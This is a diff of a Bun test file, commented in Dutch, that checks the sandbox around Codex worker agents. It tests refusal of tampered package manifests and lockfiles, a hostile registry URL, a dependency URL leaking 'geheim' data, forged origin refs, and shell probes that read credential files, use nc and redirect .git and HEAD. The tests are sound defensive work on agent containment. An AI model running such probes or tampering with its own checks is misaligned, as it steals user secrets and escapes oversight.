@@ -1,7 +1,7 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 
 // Alle tests draaien de scripts met een nep-gh en nep-tmux vooraan op PATH, in een
 // wegwerpmap met een eigen git-repo en lokale bare "origin". Geen echte tmux, geen echte PR's.
@@ -1301,6 +1301,17 @@ exit 1
     );
     return pad;
   };
+  /** Zet een bestand op origin/main (de vertrouwde kant: spawn leest het met ls-remote) én, gelijk, in de worktree van de werker. */
+  const vertrouwd = (bestand: string, inhoud: string) => {
+    git(repo, "checkout", "-q", "main");
+    mkdirSync(dirname(join(repo, bestand)), { recursive: true });
+    writeFileSync(join(repo, bestand), inhoud);
+    git(repo, "add", bestand);
+    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", `vertrouwd ${bestand}`);
+    git(repo, "push", "-q", "origin", "main");
+    mkdirSync(dirname(join(wt, bestand)), { recursive: true });
+    writeFileSync(join(wt, bestand), inhoud);
+  };
   const installLog = () => (existsSync(join(dir, "install.log")) ? readFileSync(join(dir, "install.log"), "utf8") : "");
 
   test("netwerk uit is de standaard: --netwerk zet het aan; de startzin zegt niet pushen en meldt 'klaar om te pushen'; geen install-regel zonder package.json", () => {
@@ -1309,7 +1320,7 @@ exit 1
     expect(uit.uit).toContain("network={enabled=false}");
     expect(uit.uit).toContain("push niet en draai geen gh");
     expect(uit.uit).toContain("klaar om te pushen op <sha>");
-    expect(uit.uit).toContain("scripts/lead/push-werker.sh, nooit met een git push in jouw worktree");
+    expect(uit.uit).toContain("scripts/lead/push-werker.sh, nooit met een push vanuit jouw worktree");
     expect(uit.uit).not.toContain("droog: bun install"); // K5: geen package.json
     writeFileSync(join(wt, "package.json"), "{}\n");
     expect(codex(["--map", wt, "--droog"]).uit).toContain(`droog: bun install --ignore-scripts --frozen-lockfile in ${wt}`);
@@ -1353,7 +1364,7 @@ exit 1
     const env = { LAB_LEAD_BUN: bun };
     codex(["--map", wt], env);
     expect(installLog()).toBe(""); // geen package.json
-    writeFileSync(join(wt, "package.json"), "{}\n");
+    vertrouwd("package.json", "{}\n");
     codex(["--map", wt, "--netwerk"], env);
     expect(installLog()).toBe(""); // met netwerk installeert de werker zelf
     rmSync(idDir(), { recursive: true, force: true });
@@ -1374,41 +1385,74 @@ exit 1
     expect(idBestanden()).toEqual([]);
   });
 
-  test("M1: een afwijkende of nieuwe bunfig.toml/.npmrc weigert de install; één die gelijk is aan origin/main mag", () => {
+  test("MOET-2: bun install alleen als bun.lock, elke package.json, bunfig.toml en .npmrc gelijk zijn aan origin/main (ls-remote-sha, niet te vervalsen via refs/)", () => {
     writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
-    writeFileSync(join(wt, "package.json"), "{}\n");
+    vertrouwd("package.json", "{}\n");
+    vertrouwd("packages/a/package.json", "{}\n");
+    vertrouwd("bun.lock", "{}\n");
     const env = { LAB_LEAD_BUN: nepBun() };
+    const weiger = (patroon: RegExp) => {
+      const r = codex(["--map", wt], env);
+      expect(r.code).toBe(1);
+      expect(r.fout).toMatch(patroon);
+      expect(installLog()).toBe("");
+      expect(idBestanden()).toEqual([]);
+    };
+    // een nieuw .npmrc of bunfig.toml
     writeFileSync(join(wt, ".npmrc"), "registry=http://kwaad.example/\n");
-    const r = codex(["--map", wt], env);
-    expect(r.code).toBe(1);
-    expect(r.fout).toMatch(/\.npmrc wijkt af van origin\/main/);
-    expect(installLog()).toBe("");
-    expect(idBestanden()).toEqual([]);
+    weiger(/\.npmrc in .* wijkt af van origin\/main/);
     rmSync(join(wt, ".npmrc"));
-    // gelijk aan origin/main: toegestaan
-    git(repo, "checkout", "-q", "main");
-    writeFileSync(join(repo, "bunfig.toml"), "[install]\n");
-    git(repo, "add", "bunfig.toml");
-    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "bunfig");
-    git(repo, "push", "-q", "origin", "main");
-    git(repo, "fetch", "-q", "origin");
     writeFileSync(join(wt, "bunfig.toml"), "[install]\n");
-    expect(codex(["--map", wt], env).fout).not.toMatch(/wijkt af/);
+    weiger(/bunfig\.toml in .* wijkt af/);
+    rmSync(join(wt, "bunfig.toml"));
+    // een afhankelijkheid die een GET buiten de sandbox doet, in de root, in een workspace, en in bun.lock
+    writeFileSync(join(wt, "package.json"), JSON.stringify({ dependencies: { x: "http://127.0.0.1:9/x.tgz?data=geheim" } }));
+    weiger(/package\.json in .* wijkt af/);
+    // de werker vervalst refs/remotes/origin/main met de eigen versie: de toets leest origin zelf, dus nog steeds geweigerd
+    git(wt, "add", "-f", "package.json");
+    git(wt, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "kwaad");
+    git(wt, "update-ref", "refs/remotes/origin/main", "HEAD");
+    weiger(/package\.json in .* wijkt af/);
+    writeFileSync(join(wt, "package.json"), "{}\n");
+    writeFileSync(join(wt, "packages/a/package.json"), JSON.stringify({ dependencies: { y: "file:../../geheim" } }));
+    weiger(/packages\/a\/package\.json in .* wijkt af/);
+    writeFileSync(join(wt, "packages/a/package.json"), "{}\n");
+    writeFileSync(join(wt, "bun.lock"), "{\"kwaad\": 1}\n");
+    weiger(/bun\.lock in .* wijkt af/);
+    // een symlink in plaats van het bestand (zelfde inhoud)
+    rmSync(join(wt, "bun.lock"));
+    writeFileSync(join(dir, "doel"), "{}\n");
+    symlinkSync(join(dir, "doel"), join(wt, "bun.lock"));
+    weiger(/bun\.lock in .* wijkt af/);
+    // een bestand in node_modules telt niet
+    rmSync(join(wt, "bun.lock"));
+    writeFileSync(join(wt, "bun.lock"), "{}\n");
+    mkdirSync(join(wt, "node_modules/p"), { recursive: true });
+    writeFileSync(join(wt, "node_modules/p/package.json"), "{\"x\":1}");
+    expect(codex(["--map", wt], env).code).toBe(0);
     expect(installLog()).toContain("install install");
-    rmSync(idDir(), { recursive: true, force: true });
-    writeFileSync(join(wt, "bunfig.toml"), "[install]\nregistry = \"http://kwaad.example/\"\n");
-    expect(codex(["--map", wt], env).fout).toMatch(/bunfig\.toml wijkt af/);
+  });
+
+  test("MOET-2: kan origin/main niet bepaald worden, dan geen install buiten de sandbox", () => {
+    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
+    vertrouwd("package.json", "{}\n");
+    git(repo, "remote", "set-url", "origin", join(dir, "bestaat-niet.git"));
+    const r = codex(["--map", wt], { LAB_LEAD_BUN: nepBun() });
+    expect(r.code).toBe(1);
+    expect(r.fout).toMatch(/kon origin\/main niet ophalen.*--netwerk/);
+    expect(installLog()).toBe("");
   });
 
   test("M1 (echte bun): een postinstall in de worktree draait niet; zonder --ignore-scripts zou hij wel draaien", () => {
     writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
     const marker = join(dir, "postinstall-draaide");
     const pkg = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: `touch ${marker}` } });
-    writeFileSync(join(wt, "package.json"), pkg);
+    vertrouwd("package.json", pkg);
     const schoon = { PATH: process.env.PATH ?? "", HOME: process.env.HOME ?? "" };
     // een lockfile maken zonder scripts, en de controle dat scripts zonder de vlag wel draaien (in een kopie)
     expect(Bun.spawnSync([process.execPath, "install", "--ignore-scripts"], { cwd: wt, env: schoon }).exitCode).toBe(0);
     expect(existsSync(marker)).toBe(false);
+    if (existsSync(join(wt, "bun.lock"))) vertrouwd("bun.lock", readFileSync(join(wt, "bun.lock"), "utf8")); // zonder afhankelijkheden schrijft bun er geen
     const kopie = join(dir, "kopie");
     mkdirSync(kopie);
     writeFileSync(join(kopie, "package.json"), pkg);
@@ -1419,6 +1463,19 @@ exit 1
     codex(["--map", wt], { LAB_LEAD_BUN: process.execPath });
     expect(idBestanden().length).toBe(1); // spawn kwam voorbij de install
     expect(existsSync(marker)).toBe(false);
+  });
+
+  test("ZOU-1: de identiteit legt de tak van de worktree bij de start vast (voor push-werker.sh); een losse HEAD legt er geen vast", () => {
+    writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
+    const tak = git(wt, "symbolic-ref", "--short", "HEAD").stdout.toString().trim();
+    expect(tak).not.toBe("");
+    expect(codex(["--map", wt]).code).toBe(0);
+    const id = () => JSON.parse(readFileSync(join(idDir(), idBestanden()[0]!), "utf8")) as { tak?: string; naam: string };
+    expect(id()).toMatchObject({ naam: "cx1", tak });
+    rmSync(idDir(), { recursive: true, force: true });
+    git(wt, "checkout", "-q", "--detach");
+    expect(codex(["--map", wt]).code).toBe(0);
+    expect(id().tak).toBeUndefined();
   });
 
   test("M3: de profielregel zet <worktree>/.codex op read; een bestaande .codex (ook niet-getrackt, ook een symlink) weigert spawn", () => {
@@ -1450,7 +1507,7 @@ exit 1
 
   // Echte afdwinging (zoals hierboven, nep-Responses-server): met netwerk uit geven een unix-socket (stand-in), een tmux-socket
   // (wegwerp-tmux via -S) en een uitgaande TCP-verbinding EPERM; met --netwerk slagen ze (positieve controle, de omweg uit de README).
-  const netwerkProef = async (extra: string[]): Promise<string> => {
+  const netwerkProef = async (extra: string[], eigenShell?: (thuis: string) => string): Promise<string> => {
     const codexBin = Bun.which("codex");
     writeFileSync(join(dir, "pane.txt"), "Ask Codex\n• Ran ls\n");
     const thuis = join(dir, "thuis-net");
@@ -1464,7 +1521,7 @@ exit 1
     // werktmp: de eigen tmp-map van de werker bestaat (spawn maakt hem in een echte run); /tmp zelf en de map van de test niet schrijfbaar
     const werktmp = "/tmp/lab-werker-nwproef";
     mkdirSync(werktmp, { recursive: true });
-    const shell = [
+    const shell = eigenShell?.(thuis) ?? [
       `nc -U -w1 ${sock} </dev/null; echo SOCK-RC=$?`,
       `tmux -S ${tsock} list-sessions >/dev/null; echo TMUX-RC=$?`,
       `nc -z -w1 127.0.0.1 ${tcp.port}; echo TCP-RC=$?`,
@@ -1537,6 +1594,50 @@ exit 1
       expect(rc(u, "TMPROOT-RC")).not.toBe("0");
       expect(rc(u, "WERKTMP-RC")).toBe("0");
     }
+  }, 240_000);
+
+  test("profiel (echte codex): .git, HEAD en refs/replace zijn read-only maar commit werkt; Brians inloggegevens zijn onleesbaar (wegwerp-HOME met nepbestanden)", async () => {
+    // Alleen lokaal gemeten (macOS-seatbelt met de echte codex). De nepbestanden staan in een wegwerp-HOME: nooit de echte ~/.ssh e.d. lezen.
+    if (process.platform !== "darwin" || !Bun.which("codex") || !Bun.which("tmux") || !Bun.which("nc")) {
+      console.log("profiel niet getoetst: geen macOS, codex, tmux of nc");
+      return;
+    }
+    const gitUit = (...a: string[]) => git(wt, ...a).stdout.toString().trim();
+    const c = realpathSync(gitUit("rev-parse", "--path-format=absolute", "--git-common-dir"));
+    const e = realpathSync(gitUit("rev-parse", "--path-format=absolute", "--absolute-git-dir"));
+    const m = realpathSync(wt);
+    const geheimen = [".ssh/id_nep", ".config/gh/hosts.yml", ".netrc", ".git-credentials", ".aws/credentials", ".azure/token", ".kube/config", ".docker/config.json", ".npmrc", ".config/op/sessie", "Library/Keychains/login.keychain-db"];
+    const thuis = join(dir, "thuis-net");
+    for (const g of geheimen) {
+      mkdirSync(dirname(join(thuis, g)), { recursive: true });
+      writeFileSync(join(thuis, g), "NEPGEHEIM\n");
+    }
+    writeFileSync(join(thuis, "gewoon.txt"), "gewoon\n");
+    const gc = "git -c user.name=t -c user.email=t@t";
+    const uit = await netwerkProef([], (h) =>
+      [
+        `echo x > ${m}/f; echo WRITE-RC=$?`,
+        `${gc} add f; echo ADD-RC=$?`,
+        `${gc} commit -q -m probe; echo COMMIT-RC=$?`,
+        `${gc} update-ref refs/replace/${"a".repeat(40)} HEAD; echo REPLACE-RC=$?`,
+        `echo 'ref: refs/heads/andere' > ${e}/HEAD; echo HEAD-RC=$?`,
+        `echo 'gitdir: /nergens' > ${m}/.git; echo DOTGIT-RC=$?`,
+        `mkdir -p ${c}/refs/replace/x; echo REPLACEDIR-RC=$?`,
+        `cat ${h}/gewoon.txt >/dev/null; echo GEWOON-RC=$?`,
+        ...geheimen.map((g, i) => `cat ${h}/${g} >/dev/null; echo GEHEIM${i}-RC=$?`),
+      ].join("; "),
+    );
+    const rc = (k: string) => new RegExp(`${k}=(\\d+)`).exec(uit)?.[1];
+    // positieve controles: het werkt wel, en gewone bestanden in HOME blijven leesbaar (denylist, geen allowlist)
+    for (const k of ["WRITE-RC", "ADD-RC", "COMMIT-RC", "GEWOON-RC"]) expect([k, rc(k)]).toEqual([k, "0"]);
+    // de aanvallen: replace-ref, HEAD omleggen, .git omleggen
+    for (const k of ["REPLACE-RC", "HEAD-RC", "DOTGIT-RC", "REPLACEDIR-RC"]) expect([k, rc(k) !== undefined && rc(k) !== "0"]).toEqual([k, true]);
+    for (let i = 0; i < geheimen.length; i++) expect([geheimen[i], rc(`GEHEIM${i}-RC`) !== undefined && rc(`GEHEIM${i}-RC`) !== "0"]).toEqual([geheimen[i], true]);
+    expect(uit).not.toContain("NEPGEHEIM");
+    expect(existsSync(join(c, "refs", "replace", "a".repeat(40)))).toBe(false);
+    expect(readFileSync(join(e, "HEAD"), "utf8")).not.toContain("andere");
+    expect(readFileSync(join(wt, ".git"), "utf8")).toContain("gitdir:");
+    expect(readFileSync(join(wt, ".git"), "utf8")).not.toContain("nergens");
   }, 240_000);
 
   test("hosted web search: tmux zet hem uit met -c (ook zonder MCP, ook als de config hem aanzet); T3 weigert als de config hem aanzet", () => {
